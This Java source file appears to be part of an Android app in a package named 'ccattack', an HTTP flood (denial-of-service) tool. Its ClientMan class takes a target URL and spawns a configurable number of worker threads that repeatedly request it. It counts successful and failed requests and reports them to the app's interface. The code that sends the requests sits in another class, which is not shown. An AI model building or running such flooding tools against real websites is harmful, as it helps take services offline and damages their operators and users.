package moe.bsod.ccattack;

import android.os.Handler;
import android.os.Message;
import android.util.Pair;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;

/**
 * Created by anthony on 10/11/17.
 */

public class ClientMan extends Thread {

	private URL urlreq;
	private int tcount;
	private Handler granthd;

	private int loopcount;

	public boolean threadAlive = true;
	public boolean connected = false;

	public static final int CLIENTMAN_START = 0xFACEBAAD;
	public static final int CLIENTMAN_DIED = 0xBAADFACE;
	public static final int CLIENTMAN_UPDATE_DATA = 0xBEEFBEAD;

	public ArrayList<ClientBrowser> thread_slot;

	public ClientMan(Handler grantHd, String url, int thread_count, int loop_count)
			throws MalformedURLException {
		urlreq = new URL(url);
		tcount = thread_count;
		connected = true;
		granthd = grantHd;
		loopcount = loop_count;
		thread_slot = new ArrayList<>();
	}

	public void terminate() {
		threadAlive = false;
	}

	@Override
	public void run() {
		try {
			for (int counter = tcount; counter > 0; counter--) {
				ClientBrowser cb = new ClientBrowser(urlreq.toString(), loopcount);
				cb.start();
				thread_slot.add(cb);
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
			connected = false;
		}

		Message msg = new Message();
		msg.what = CLIENTMAN_START;
		granthd.sendMessage(msg);

		long req_orig = 0;
		long fail_orig = 0;

		while (threadAlive) {
			long req = 0;
			long fail = 0;

			for (ClientBrowser cb : thread_slot) {
				req += cb.getReq_count();
				fail += cb.getFail_count();
			}

			if (req_orig != req || fail_orig != fail) {

				req_orig = req;
				fail_orig = fail;

				msg = new Message();
				msg.what = CLIENTMAN_UPDATE_DATA;
				msg.obj = Pair.create(req, fail);
				granthd.sendMessage(msg);
			}

			if (loopcount > 0) {
				boolean still_peer_survived = false;
				for (ClientBrowser cb : thread_slot) {
					if (still_peer_survived = cb.isTerminate())
						break;
				}
				if (still_peer_survived)
					break;
			}

			try {
				if (threadAlive)
					Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}

		for (ClientBrowser cb : thread_slot) {
			cb.terminate();
		}

		try {
			Thread.sleep(50);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		msg = new Message();
		msg.what = CLIENTMAN_DIED;
		granthd.sendMessage(msg);


	}

}
